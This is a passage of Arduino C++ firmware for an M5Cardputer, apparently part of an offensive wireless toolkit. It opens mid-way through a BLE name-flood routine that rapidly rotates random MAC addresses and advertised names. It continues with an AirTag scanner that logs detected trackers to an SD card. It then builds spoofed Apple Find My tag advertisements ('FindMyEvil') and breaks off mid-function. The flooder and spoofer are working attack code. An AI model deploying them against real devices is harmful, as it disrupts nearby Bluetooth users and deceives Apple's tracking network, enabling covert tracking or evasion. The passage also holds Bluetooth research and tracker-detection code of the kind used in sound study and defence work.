    M5.Display.setTextColor(TFT_GREEN);
    M5.Display.setCursor(62, 76);
    M5.Display.printf("%lu", pubCount);

    unsigned long sec = (millis() - startTs) / 1000UL;
    unsigned int mm = sec / 60U; unsigned int ss = sec % 60U;
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(60, 94);
    char buf[8]; snprintf(buf, sizeof(buf), "%02u:%02u", mm, ss);
    M5.Display.print(buf);

    M5.Display.setTextColor(TFT_YELLOW);
    M5.Display.setCursor(170, 94);
    M5.Display.printf("%.1f", rate);
  };

  String currentName;

  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
    M5Cardputer.update();
    unsigned long now = millis();

    // ==== SPEED TOGGLES ====
    if (M5Cardputer.Keyboard.isKeyPressed('t')) {
      while (M5Cardputer.Keyboard.isKeyPressed('t')) {
        M5Cardputer.update();
        delay(10);
      }
      speedMode = 1;
      switchInterval = 5;
      uiUpdateSpeedLabel(speedMode);
      delay(150);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('s')) {
      while (M5Cardputer.Keyboard.isKeyPressed('s')) {
        M5Cardputer.update();
        delay(10);
      }
      speedMode = 2;
      switchInterval = 500;
      uiUpdateSpeedLabel(speedMode);
      delay(150);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('n')) {
      while (M5Cardputer.Keyboard.isKeyPressed('n')) {
        M5Cardputer.update();
        delay(10);
      }
      speedMode = 0;
      switchInterval = 55;
      uiUpdateSpeedLabel(speedMode);
      delay(150);
    }

    if (now - lastSwitch >= switchInterval) {
      esp_ble_gap_stop_advertising();
      delay(3);

      if (useRandom) currentName = generateRandomBLEName_Full();
      else {
        currentName = bleNames[index];
        while (currentName.length() > 29) currentName.remove(currentName.length() - 1);
        index = (index + 1) % bleNames.size();
      }

      uint8_t newAddr[6];
      esp_fill_random(newAddr, sizeof(newAddr));
      newAddr[0] = (newAddr[0] & 0x3F) | 0xC0;
      esp_ble_gap_set_rand_addr(newAddr);

      BLEAdvertisementData advData; advData.setFlags(ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT); advData.setName(currentName.c_str());
      pAdvertising->setAdvertisementData(advData);

      BLEAdvertisementData scanData; scanData.setName(currentName.c_str());
      pAdvertising->setScanResponseData(scanData);

      esp_ble_gap_set_device_name(currentName.c_str());
      esp_ble_gap_start_advertising(&adv_params);

      ++pubCount;
      printName(currentName);

      // ==== LED BEHAVIOR ====
      if (ledOn) {
        if (speedMode == 1) {  // TURBO => RAINBOW
          pixels.setPixelColor(0, wheel(rainbowPos++));
          if (rainbowPos == 255) rainbowPos = 0;
        } else {               // NORMAL + SLOW => RGB CYCLE
          switch (ledState) {
            case 0: pixels.setPixelColor(0, pixels.Color(255, 0, 0)); break;
            case 1: pixels.setPixelColor(0, pixels.Color(0, 255, 0)); break;
            case 2: pixels.setPixelColor(0, pixels.Color(0, 0, 255)); break;
          }
          ledState = (ledState + 1) % 3;
        }
        pixels.show();
      }

      lastSwitch = now;
    }

    if (now - lastRateTs >= 1000) {
      rate = (float)(pubCount - prevCount) / ((now - lastRateTs) / 1000.0f);
      prevCount = pubCount;
      lastRateTs = now;
      M5.Display.fillRect(170, 92, 50, 16, TFT_BLACK);
      M5.Display.setTextColor(TFT_YELLOW);
      M5.Display.setCursor(170, 94);
      M5.Display.printf("%.1f", rate);
    }

    delay(1);
  }

  esp_ble_gap_stop_advertising();
  releaseBLE();
  pixels.setPixelColor(0, 0);
  pixels.show();
  M5.Display.fillCircle(220, 20, 4, TFT_RED);
  delay(120);
  waitAndReturnToMenu("BLENameFlood stopped");
}




/*
  ============================================================================================================================
  // ======== Wall Of AirTags ========
  ============================================================================================================================
*/

// ==== CONSTANTES UI ====
#define AT_BG            TFT_BLACK
#define AT_ACCENT        TFT_LIGHTGREY
#define AT_TEXT          TFT_WHITE
#define AT_MUTED         TFT_DARKGREY

const int AT_HDR_H    = 18;
const int AT_SPAM_H   = 3 * 12 + 8;
const int AT_LIST_Y   = AT_HDR_H + 2;
const int AT_LIST_H   = 135 - AT_HDR_H - AT_SPAM_H - 4;
const int AT_LINE_H   = 9;   // Ã©tait 10
const int AT_GAP      = 2;   // inchangÃ©
const int AT_VISIBLE  = (AT_LIST_H / (AT_LINE_H + AT_GAP));



// === DEBUG LOGS ===
#ifndef AT_DEBUG
#define AT_DEBUG 1
#endif
#if AT_DEBUG
#define AT_LOG(...) Serial.printf(__VA_ARGS__)
#else
#define AT_LOG(...)
#endif

// ==== STRUCTURE ====
struct AtItem {
  String mac;
  int rssi;
  float distance;
  String trend;
  String payload;
  String name;
  String uuid;
  unsigned long lastSeen;
};

static std::vector<AtItem> atItems;
int atCount = 0;

int atTop = 0;
int atSel = 0;

unsigned long atLastListUpdate = 0;
unsigned long atLastHeaderUpdate = 0;
unsigned long atLastSpamUpdate = 0;

String atSpam[2];
int atSpamHead = 0;

// ==== BLE EVENT QUEUE (Safe processing outside BTC_TASK) ====
#include <freertos/queue.h>

typedef struct {
  char mac[18];           // "AA:BB:CC:DD:EE:FF"
  int rssi;
  uint8_t md[32];         // Manufacturer Data (clamped)
  uint8_t md_len;
  char name[32];          // Nom GAP si prÃ©sent (souvent vide pour AirTag)
  char uuid[40];          // Service UUID si prÃ©sent (souvent vide pour AirTag)
} AtEvent;


QueueHandle_t atEvtQueue = nullptr;
volatile uint32_t atDroppedEvents = 0;

String determineTrend(int newRSSI, int oldRSSI) {
  int delta = abs(newRSSI - oldRSSI);
  if (delta < 3) return "Stable";
  return (newRSSI > oldRSSI) ? "Closer" : "Farther";
}

float calculateDistance(int rssi) {
  const int txPower = -59;
  const float n = 2.0f; // path loss exponent
  return pow(10.0f, ((float)txPower - (float)rssi) / (10.0f * n));
}


bool isAppleFindMy(const std::string& md) {
  if (md.length() < 15) return false;
  const uint8_t* d = reinterpret_cast<const uint8_t*>(md.data());

  return (
           d[0] == 0x4C && d[1] == 0x00 &&      // Apple Vendor ID
           d[2] == 0x12 && d[3] == 0x19 &&      // FindMy Service / Payload Type
           !(d[4] == 0x00 && d[5] == 0x00)      // Payload not blank (avoid noise)
         );
}

int atFindByMac(const String& mac) {
  for (int i = 0; i < atCount; ++i)
    if (atItems[i].mac == mac) return i;
  return -1;
}

// ==== SD CARD ====
bool isMacSaved(const String& mac) {
  File file = SD.open("/evil/airtags.txt", FILE_READ);
  if (!file) return false;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.indexOf(mac) >= 0) {
      file.close();
      return true;
    }
  }
  file.close();
  return false;
}

void recordAirTag(const String& mac, const String& name, const String& uuid, int rssi) {
  if (isMacSaved(mac)) return;
  File file = SD.open("/evil/airtags.txt", FILE_APPEND);
  if (!file) return;
  String line = mac + " - RSSI: " + String(rssi);
  if (name.length()) line += " - Name: " + name;
  if (uuid.length()) line += " - UUID: " + uuid;
  file.println(line);
  file.close();
  AT_LOG("[SD] Saved AirTag: %s\n", line.c_str());
}

// ==== UI ====
void atDrawHeader(bool force = false) {
  unsigned long now = millis();
  if (!force && (now - atLastHeaderUpdate) < 300) return;
  atLastHeaderUpdate = now;

  M5.Display.fillRect(0, 0, 240, AT_HDR_H, AT_ACCENT);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_BLACK, AT_ACCENT);
  M5.Display.setCursor(6, 4);
  M5.Display.print("Wall of AirTags");
  char buf[24];
  snprintf(buf, sizeof(buf), "Total: %d", atCount);
  int w = M5.Display.textWidth(buf);
  M5.Display.setCursor(240 - w - 6, 4);
  M5.Display.print(buf);
}

void atDrawList(bool force = false) {
  unsigned long now = millis();
  if (!force && (now - atLastListUpdate) < 150) return;
  atLastListUpdate = now;

  int purged = 0;
  for (int i = 0; i < atCount; ) {
    if (now - atItems[i].lastSeen > 7500) {
      if (purged < 3) {
        AT_LOG("[INFO] Purge stale: %s (age=%lums)\n", atItems[i].mac.c_str(), now - atItems[i].lastSeen);
      }
      atItems.erase(atItems.begin() + i);
      atCount = (int)atItems.size();
      purged++;
    } else {
      i++;
    }
  }
  if (purged > 3) AT_LOG("[INFO] Purged %d stale entries\n", purged);

  M5.Display.fillRect(0, AT_LIST_Y, 240, AT_LIST_H, AT_BG);

  for (int row = 0; row < AT_VISIBLE; ++row) {
    int idx = atTop + row;
    if (idx >= atCount) break;

    // Y avec petit Ã©cart de 2 px entre lignes
    int y = AT_LIST_Y + row * (AT_LINE_H + AT_GAP);
    const AtItem& item = atItems[idx];

    // Texte gauche (nom sinon MAC)
    // taille 1 -> on peut pousser un peu la largeur de coupe
    String left  = (item.name.length() > 0) ? fitLeft(item.name, 22) : fitLeft(item.mac, 22);
    String right = String(item.rssi) + "dBm";

    // Couleur de tendance
    uint16_t color = TFT_GREEN;
    if (item.trend == "Closer") color = TFT_RED;
    else if (item.trend == "Farther") color = TFT_BLUE;

    // Indicateur de sÃ©lection '>'
    M5.Display.setTextSize(1);
    if (idx == atSel) {
      M5.Display.setTextColor(AT_TEXT, AT_BG);
      M5.Display.setCursor(2, y);
      M5.Display.print(">");
    } else {
      // Nettoie la colonne chevron si besoin
      M5.Display.fillRect(2, y, 8, AT_LINE_H, AT_BG);
    }

    // Ligne
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(color, AT_BG);
    M5.Display.setCursor(12, y);           // dÃ©cale pour laisser le '>'
    M5.Display.print(left);

    int w = M5.Display.textWidth(right);
    M5.Display.setCursor(240 - w - 4, y);
    M5.Display.print(right);
  }
}



void atDrawSpamBox(bool force = false) {
  unsigned long now = millis();
  if (!force && (now - atLastSpamUpdate) < 150) return;
  atLastSpamUpdate = now;

  int y = 135 - AT_SPAM_H;

  M5.Display.drawRoundRect(3, y, 234, AT_SPAM_H - 4, 5, AT_MUTED);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(AT_MUTED, AT_BG);
  M5.Display.setCursor(10, y + 2);
  M5.Display.print("BLE Frame (last seen) ");

  M5.Display.fillRect(5, y + 14, 230, AT_SPAM_H - 20, AT_BG);
  M5.Display.setTextColor(AT_TEXT, AT_BG);

  // Nâ€™afficher que la toute derniÃ¨re entrÃ©e
  int idx = (atSpamHead - 1 + 2) % 2;
  if (atSpam[idx].length() > 0) {
    M5.Display.setCursor(10, y + 18);
    M5.Display.print(atSpam[idx]);
  }
}


void atPushSpam(const String& s) {
  atSpam[atSpamHead] = s;
  atSpamHead = (atSpamHead + 1) % 2;
  atDrawSpamBox(true);
}

void atPushItem(const String& mac, int rssi, const String& payload, const String& name, const String& uuid) {
  int idx = atFindByMac(mac);
  static const int AT_MAX = 24;
  if (idx < 0) {
    if (atCount >= AT_MAX) {
      if (!atItems.empty()) atItems.erase(atItems.begin());
    }
    atItems.emplace_back();
    idx = (int)atItems.size() - 1;
    atCount = (int)atItems.size();
  }

  float dist = calculateDistance(rssi);
  String trend = (idx >= 0) ? determineTrend(rssi, atItems[idx].rssi) : "Stable";

  atItems[idx].mac = mac;
  atItems[idx].rssi = rssi;
  atItems[idx].distance = dist;
  atItems[idx].trend = trend;
  atItems[idx].payload = payload;
  atItems[idx].name = name;
  atItems[idx].uuid = uuid;
  atItems[idx].lastSeen = millis();

  AT_LOG("[INFO] %s RSSI=%d Trend=%s Dist=%.2f\n", mac.c_str(), rssi, trend.c_str(), dist);

  atDrawHeader(false);
  atDrawList(true);
  recordAirTag(mac, name, uuid, rssi);
}

class AtAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      // Travail minimal dans le callback (Ã©vite BTC_TASK stack canary)
      std::string md = advertisedDevice.getManufacturerData();
      if (!isAppleFindMy(md)) return;

      AtEvent evt = {};
      std::string smac = advertisedDevice.getAddress().toString();
      snprintf(evt.mac, sizeof(evt.mac), "%s", smac.c_str());
      evt.rssi = advertisedDevice.getRSSI();

      size_t copyLen = md.size();
      if (copyLen > sizeof(evt.md)) copyLen = sizeof(evt.md);
      if (copyLen > 0) {
        memcpy(evt.md, md.data(), copyLen);
        evt.md_len = (uint8_t)copyLen;
      }

      // â†’ Ces deux champs sont souvent vides pour AirTag, mais on les remplit si dispo
      if (advertisedDevice.haveName()) {
        std::string sname = advertisedDevice.getName();
        snprintf(evt.name, sizeof(evt.name), "%s", sname.c_str());
      }
      if (advertisedDevice.haveServiceUUID()) {
        std::string suuid = advertisedDevice.getServiceUUID().toString();
        snprintf(evt.uuid, sizeof(evt.uuid), "%s", suuid.c_str());
      }

      if (atEvtQueue) {
        BaseType_t ok = xQueueSend(atEvtQueue, &evt, 0);
        if (ok == pdFALSE) {
          atDroppedEvents++;
          if ((atDroppedEvents % 16) == 0) {
            AT_LOG("[QUEUE] Drop count=%lu\n", (unsigned long)atDroppedEvents);
          }
        }
      }
    }
};


// ==== INFOS ====
void showAtDetails(int idx) {
  if (idx < 0 || idx >= atCount) return;
  const AtItem& i = atItems[idx];

  // Ecran d'info
  M5.Display.fillScreen(AT_BG);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(AT_TEXT);

  int y = 8;
  const int lh = 13;  // line height confortable en size=1

  M5.Display.setCursor(10, y);           M5.Display.print("INFO AirTag"); y += lh + 2;
  M5.Display.drawLine(10, y, 230, y, AT_MUTED); y += 6;

  M5.Display.setCursor(10, y);           M5.Display.print("MAC: ");  M5.Display.print(i.mac);                 y += lh;
  M5.Display.setCursor(10, y);           M5.Display.print("RSSI: "); M5.Display.print(i.rssi); M5.Display.print(" dBm"); y += lh;
  M5.Display.setCursor(10, y);           M5.Display.print("Trend: "); M5.Display.print(i.trend);              y += lh;
  M5.Display.setCursor(10, y);           M5.Display.print("Dist: ");  M5.Display.print(String(i.distance, 2)); M5.Display.print(" m"); y += lh;

  // Nom / UUID (tronquÃ©s proprement Ã  l'affichage)
  M5.Display.setCursor(10, y);           M5.Display.print("Name: ");  M5.Display.print(fitLeft(i.name, 26));   y += lh;
  M5.Display.setCursor(10, y);           M5.Display.print("UUID: ");  M5.Display.print(fitLeft(i.uuid, 26));   y += lh + 6;

  M5.Display.setTextColor(AT_MUTED, AT_BG);
  M5.Display.setCursor(10, 120);
  M5.Display.print("Backspace to quit");

  for (;;) {
    M5Cardputer.update();
    M5.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        M5Cardputer.update();
        delay(10);
      }
      break;
    }
    delay(10);
  }

  // Retour Ã  l'UI principale
  atDrawHeader(true);
  atDrawList(true);
  atDrawSpamBox(true);
}


// ==== INPUT ====
void atHandleKeys(bool& shouldExit) {
  M5Cardputer.update();
  M5.update();

  if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) || M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    shouldExit = true;
    return;
  }

  static unsigned long lastKey = 0;
  const unsigned long rpt = 130;

  if (M5Cardputer.Keyboard.isKeyPressed(';')) {
    if (millis() - lastKey > rpt) {
      if (atSel > 0) atSel--;
      if (atSel < atTop) atTop = atSel;
      atDrawList(true);
      lastKey = millis();
    }
  } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
    if (millis() - lastKey > rpt) {
      if (atSel < max(0, atCount - 1)) atSel++;
      if (atSel >= (atTop + AT_VISIBLE))
        atTop = max(0, atSel - (AT_VISIBLE - 1));
      atDrawList(true);
      lastKey = millis();
    }
  } else if (M5Cardputer.Keyboard.isKeyPressed('i')) {
    showAtDetails(atSel);
  }
}

// ==== HELPERS ====
inline String hexPayloadFromMd(const uint8_t* data, uint8_t len) {
  String s;
  if (len == 0) return s;
  s.reserve(len * 2);
  for (uint8_t i = 0; i < len; ++i) {
    uint8_t b = data[i];
    if (b < 16) s += "0";
    s += String(b, HEX);
  }
  return s;
}

// ==== MAIN ====
void wallOfAirTags() {
  bool exitRequested = false;
  atTop = 0; atSel = 0;
  atItems.clear();
  atItems.reserve(24);
  atCount = 0;
  atSpam[0] = ""; atSpam[1] = ""; atSpamHead = 0;
  atDroppedEvents = 0;

  if (!atEvtQueue) {
    atEvtQueue = xQueueCreate(16, sizeof(AtEvent));
    if (!atEvtQueue) {
      AT_LOG("[ERR] atEvtQueue create failed\n");
    } else {
      AT_LOG("[OK] atEvtQueue ready\n");
    }
  }

  M5.Display.fillScreen(AT_BG);
  atDrawHeader(true);
  atDrawList(true);
  atDrawSpamBox(true);

  initializeBLEIfNeeded();
  enterDebounce();

  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new AtAdvertisedDeviceCallbacks(), true);
  pBLEScan->setActiveScan(true);

  unsigned long lastStats = millis();

  while (!exitRequested) {
    atHandleKeys(exitRequested);

    // BLE scan slice (non-blocking)
    pBLEScan->start(1, nullptr, false);   // callback async â†’ 0 ms de blocage

    // Drain queue safely outside BTC_TASK
    AtEvent evt;
    int processed = 0;
    while (atEvtQueue && xQueueReceive(atEvtQueue, &evt, 0) == pdTRUE) {

      String mac = String(evt.mac);
      String hexPayload = hexPayloadFromMd(evt.md, evt.md_len);

      // Optional GAP device name
      String name = (evt.name[0]) ? String(evt.name) : "";

      // Optional Service UUID
      String uuid = (evt.uuid[0]) ? String(evt.uuid) : "";

      if (uuid.length() == 0) {
        uuid = hexPayload;   // keep full frame in UUID field
      }

      // Debug logs only if relevant
      if (name.length()) AT_LOG("[ADV] name=%s\n", name.c_str());
      if (uuid.length()) AT_LOG("[ADV] uuid=%s\n", uuid.c_str());

      atPushItem(mac, evt.rssi, hexPayload, name, uuid);
      atPushSpam(hexPayload);

      processed++;
      if (processed >= 12) break;   // Avoid UI freeze in heavy BLE bursts
    }

    // Periodic stats (non-spammy)
    if (millis() - lastStats > 500) {
      lastStats = millis();
      if (processed > 0 || atDroppedEvents > 0) {
        AT_LOG("[BLE] tick processed=%d, dropped=%lu, total=%d\n",
               processed, (unsigned long)atDroppedEvents, atCount);
      }
    }

    atDrawList(false);
    atDrawSpamBox(false);
  }

  waitAndReturnToMenu("Scan stopped...");
}


/*
  ============================================================================================================================
  // ======== FINDMYEVIL ADVERTISER ========
  // https://github.com/seemoo-lab/openhaystack
  // https://github.com/biemster/FindMy
  ============================================================================================================================
*/

#include "esp_bt.h"          // esp_ble_tx_power_set
#include "esp_gap_ble_api.h" // GAP raw APIs


// --- Etat TX global ---
bool        fmTxOn         = false;
uint32_t    fmRotateMs     = 10000;   // rotation UID (si souhaitÃ©e) - ici, on tourne sur les tags
uint32_t    fmLastRot      = 0;
uint16_t    fmIntMs        = 200;     // intervalle pub (ms)
esp_power_level_t fmTxPwr  = ESP_PWR_LVL_P3; // ~+3 dBm

// --- Mode / config ---
bool        fmModeChosen       = false;  // le choix SD vs LAB a-t-il dÃ©jÃ  Ã©tÃ© fait ?
bool        fmUseFindMy  = false;  // true = utiliser clÃ©s SD, false = clÃ©s random LAB

// --- Multi-tags ---
// adv_key = clÃ© de pub Find My / FindMy (28 octets, P-224)
struct FakeTag {
  uint8_t adv_key[28];  // advertising key (P-224 compressed)
  uint8_t mac[6];       // Random static dÃ©rivÃ©e de adv_key (bits 7..6 de l'octet 0 = '11')
};
static const int FMTAG_MAX = 20;
std::vector<FakeTag> fmTags;
int      fmTagCount   = 0;
int      fmTagIdx     = 0;     // tag courant
uint32_t fmLastSwitch = 0;     // tick dernier switch de tag
uint32_t fmSlotMs     = 100;   // durÃ©e d'exposition d'un tag avant le suivant

// --- Adv params GAP (rÃ©utilisÃ©s) ---
esp_ble_adv_params_t fmAdvParams;

// ======================================================================
// Helpers ADV KEY / MAC / ADV
// ======================================================================

// GÃ©nÃ¨re une adv_key random pour LAB (pas forcÃ©ment un vrai point P-224 valide).
// Pour un usage FindMy rÃ©el: remplacer par les clÃ©s fournies par FindMy.
inline void fmGenAdvKeyLab(uint8_t adv_key[28]) {
  for (int i = 0; i < 28; ++i) {
    adv_key[i] = (uint8_t)esp_random();
  }
}

// Ancienne version (MAC full random) - laissÃ©e si besoin ailleurs
inline void fmMakeStaticRandom(uint8_t mac[6]) {
  // Random Address: 2 bits MSB du premier octet = '11'
  uint32_t r1 = esp_random();
  uint32_t r2 = esp_random();
  mac[0] = 0xC0 | (r1 & 0x3F);
  mac[1] = (r1 >> 8) & 0xFF;
  mac[2] = (r1 >> 16) & 0xFF;
  mac[3] = (r1 >> 24) & 0xFF;
  mac[4] = r2 & 0xFF;
  mac[5] = (r2 >> 8) & 0xFF;
}

// Nouvelle version: dÃ©rive la MAC Ã  partir des 6 premiers octets de adv_key,
// avec les bits 7..6 mis Ã  '11' (Random Static), comme dans FindMy/AirTag.
inline void fmMacFromAdvKey(const uint8_t adv_key[28], uint8_t mac[6]) {
  mac[0] = (adv_key[0] & 0x3F) | 0xC0;   // 2 MSB = 11b
  mac[1] = adv_key[1];
  mac[2] = adv_key[2];
  mac[3] = adv_key[3];
  mac[4] = adv_key[4];
  mac[5] = adv_key[5];
}

uint16_t fmAdvUnitsFromMs(uint16_t ms) {
  if (ms < 200)    ms = 200;
  if (ms > 10000) ms = 10000;
  uint32_t num = (uint32_t)ms * 1000 + 312; // +0.312 ms arrondi
  return (uint16_t)(num / 625);
}

/*
  Construit un ADV Raw Find My-like (FindMy) :

  AD structure unique: Manufacturer Specific Data
    [0]  : 0x1E (longueur = 30 octets suivants: type + vendor + payload)
    [1]  : 0xFF                          (AD type = Manufacturer Specific)
    [2]  : 0x4C, [3] = 0x00              (Apple Company ID, LE = 0x004C)
    [4]  : 0x12                          (offline finding type)
    [5]  : 0x19                          (longueur payload Apple = 25 bytes)
    [6]  : state/status                  (0x00: dÃ©faut)
    [7-28]  : adv_key[6..27]            (22 octets de la clÃ©)
    [29] : adv_key[0] >> 6              (2 bits de la clÃ©)
    [30] : 0x00                         (hint / counter)

  -> total 31 octets dans "out".
*/
uint8_t fmBuildRawAdv(const uint8_t adv_key[28], uint8_t* out) {
  uint8_t i = 0;

  // Longueur du bloc Manufacturer Specific (30 octets aprÃ¨s)
  out[i++] = 0x1E;    // length

  // Type Manufacturer Specific
  out[i++] = 0xFF;    // AD type

  // Apple Company ID
  out[i++] = 0x4C;
  out[i++] = 0x00;

  // Find My offline finding
  out[i++] = 0x12;    // type
  out[i++] = 0x19;    // longueur du "offline finding payload" (25)

  // Status (FindMy utilise en gÃ©nÃ©ral 0x00)
  uint8_t state = 0x00;
  out[i++] = state;

  // 22 octets suivants de la clÃ©: adv_key[6..27]
  memcpy(&out[i], &adv_key[6], 22);
  i += 22;

  // Bits dÃ©rivÃ©s de adv_key[0]
  out[i++] = adv_key[0] >> 6;

  // Hint / counter 
  out[i++] = 0x00;

  // i == 31
  return i; // longueur totale
}

// ======================================================================
// Parsing HEX & chargement FindMy depuis la SD
// ======================================================================

int fmHexNibble(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  return -1;
}

// Parse une ligne texte en 28 octets HEX (ignores espaces, ':', etc.)
bool fmParseHexAdvKey(const char* line, uint8_t adv_key[28]) {
  int count = 0;
  int hi    = -1;

  for (int i = 0; line[i] != '\0' && line[i] != '\r' && line[i] != '\n'; ++i) {
    int v = fmHexNibble(line[i]);
    if (v < 0) continue; // ignore non-hex

    if (hi < 0) {
      hi = v;
    } else {
      adv_key[count++] = (uint8_t)((hi << 4) | v);
      hi = -1;
      if (count >= 28) break;
    }
  }
  return (count == 28);
}

bool fmLoadFindMyKeysFromSD() {
  const char* path = "/evil/FindMyEvil_keys.txt";
  File f = SD.open(path, FILE_READ);
  if (!f) {
    AT_LOG("[FM-TX] SD: file %s not found\n", path);
    return false;
  }

  char line[128];
  int  loaded = 0;
  fmTags.clear();

  while (f.available() && loaded < 20) {
    size_t len = f.readBytesUntil('\n', line, sizeof(line) - 1);
    line[len]  = '\0';

    uint8_t adv[28];
    if (fmParseHexAdvKey(line, adv)) {
      if (loaded < FMTAG_MAX) {
        fmTags.emplace_back();
        memcpy(fmTags[loaded].adv_key, adv, 28);
        fmMacFromAdvKey(fmTags[loaded].adv_key, fmTags[loaded].mac);
        AT_LOG("[FM-TX] SD tag #%d KEY=%02X%02X%02X%02X... MAC=%02X:%02X:%02X:%02X:%02X:%02X\n",
               loaded,
               adv[0], adv[1], adv[2], adv[3],
               fmTags[loaded].mac[0], fmTags[loaded].mac[1], fmTags[loaded].mac[2],
               fmTags[loaded].mac[3], fmTags[loaded].mac[4], fmTags[loaded].mac[5]);
        loaded++;
      }
    }
  }
  f.close();

  fmTagCount = loaded;
  fmTagIdx   = 0;

  if (!loaded) {
    AT_LOG("[FM-TX] SD: no valid adv_key found in %s\n", path);
    return false;
  }

  AT_LOG("[FM-TX] SD: loaded %d FindMy keys\n", loaded);
  return true;
}

// ======================================================================
// BLE ADV helpers
// ======================================================================

void fmStopRawAdv() {
  esp_ble_gap_stop_advertising();
}

void fmStartTagRaw(const FakeTag& t) {
  // ArrÃªter proprement
  fmStopRawAdv();

  // Appliquer l'adresse MAC random statique dÃ©rivÃ©e de adv_key
  esp_ble_gap_set_rand_addr((uint8_t*)t.mac);

  // Configurer ADV raw (Manufacturer Apple uniquement)
  uint8_t raw[31];
  uint8_t len = fmBuildRawAdv(t.adv_key, raw);
  esp_ble_gap_config_adv_data_raw(raw, len);

  // ParamÃ¨tres d'advertising
  memset(&fmAdvParams, 0, sizeof(fmAdvParams));
  uint16_t iu = fmAdvUnitsFromMs(fmIntMs);
  fmAdvParams.adv_int_min       = iu;
  fmAdvParams.adv_int_max       = iu;

  // AirTag / FindMy utilisent des paquets non-connectables
  fmAdvParams.adv_type          = ADV_TYPE_NONCONN_IND;

  fmAdvParams.own_addr_type     = BLE_ADDR_TYPE_RANDOM;               // <- important
  fmAdvParams.channel_map       = ADV_CHNL_ALL;
  fmAdvParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

  // Petit dÃ©lai pour laisser le contrÃ´leur digÃ©rer la config
  vTaskDelay(pdMS_TO_TICKS(5));
  esp_err_t st = esp_ble_gap_start_advertising(&fmAdvParams);

  AT_LOG("[FM-TX] tag #%d start ADV: int=%ums, mac=%02X:%02X:%02X:%02X:%02X:%02X, key=%02X%02X%02X%02X...\n",
         fmTagIdx, fmIntMs,
         t.mac[0], t.mac[1], t.mac[2], t.mac[3], t.mac[4], t.mac[5],
         t.adv_key[0], t.adv_key[1], t.adv_key[2], t.adv_key[3]);
  (void)st;
}

// ======================================================================
// UI
// ======================================================================

void fmDrawHeader(bool on) {
  M5.Display.fillRect(0, 0, 240, AT_HDR_H, AT_ACCENT);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_BLACK, AT_ACCENT);
  M5.Display.setCursor(6, 4);
  M5.Display.print("FindMyEvil");

  // Ã‰tat ON/OFF
  const char* s = on ? "ON" : "OFF";
  int w = M5.Display.textWidth(s);
  M5.Display.setCursor(240 - w - 6, 4);
  M5.Display.print(s);

  // Niveau batterie Ã  droite (avant le ON/OFF)
  String batteryLevel = getBatteryLevel(); // Cette fonction existe dÃ©jÃ  dans le projet principal
  int batWidth = M5.Display.textWidth(batteryLevel + "%");
  M5.Display.setCursor(240 - w - batWidth - 12, 4);
  M5.Display.print(batteryLevel + "%");
}


void fmDrawBody() {
  M5.Display.fillRect(0, AT_LIST_Y, 240, 135 - AT_LIST_Y, AT_BG);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(AT_TEXT, AT_BG);

  int y = AT_LIST_Y + 2;
  M5.Display.setCursor(8, y);   M5.Display.print("Interval: "); M5.Display.print(fmIntMs); M5.Display.print(" ms"); 
  y += 12;
  M5.Display.setCursor(8, y);   M5.Display.print("Slot:     "); M5.Display.print(fmSlotMs); M5.Display.print(" ms"); 
  y += 12;

  M5.Display.setCursor(8, y);
  M5.Display.print("Mode: ");
  M5.Display.print(fmUseFindMy ? "FindMy Keys" : "LAB random");
  y += 12;

  M5.Display.setCursor(8, y);   M5.Display.print("Tags:     "); M5.Display.print(fmTagCount);
  y += 12;

  // AperÃ§u adv_key (tag courant)
  if (fmTagCount) {
    char line[3 * 8 + 1]; int p = 0;
    for (int i = 0; i < 8; i++) {
      p += snprintf(line + p, sizeof(line) - p, "%02X ", fmTags[fmTagIdx].adv_key[i]);
    }
    M5.Display.setCursor(8, y); M5.Display.print("KEY: "); M5.Display.print(line); y += 14;

    char macs[18];
    snprintf(macs, sizeof(macs), "%02X:%02X:%02X:%02X:%02X:%02X",
             fmTags[fmTagIdx].mac[0], fmTags[fmTagIdx].mac[1], fmTags[fmTagIdx].mac[2],
             fmTags[fmTagIdx].mac[3], fmTags[fmTagIdx].mac[4], fmTags[fmTagIdx].mac[5]);
    M5.Display.setCursor(8, y); M5.Display.print("MAC: "); M5.Display.print(macs); y += 16;
  }

  M5.Display.setTextColor(AT_MUTED, AT_BG);
  M5.Display.setCursor(8, y);   M5.Display.print("[SPACE] ON/OFF  [B] Save mode");
  y += 12;
  M5.Display.setCursor(8, y);   M5.Display.print("[R] rotate KEY  [+]/[-] interval");
  y += 12;
  M5.Display.setCursor(8, y);   M5.Display.print("[N] add tag  [BKSP/ENTER] exit");
}

void fmRedrawAll() {
  fmDrawHeader(fmTxOn);
  fmDrawBody();
}

// ======================================================================
// Ecran principal TX (multi-tags)
// ======================================================================

void FindMyEvilTx() {
  bool exitRequested = false;

  // Reset state pour chaque entrÃ©e dans cet Ã©cran
  fmTxOn           = false;
  fmTagCount       = 0;
  fmTagIdx         = 0;
  fmLastSwitch     = 0;
  fmModeChosen     = false;
  fmUseFindMy = false;
  fmTags.clear();

  // On â€œrÃ©initialiseâ€ proprement lâ€™environnement BLE (comme Evil-cardputer)
  //releaseBLE();
  initializeBLEIfNeeded();

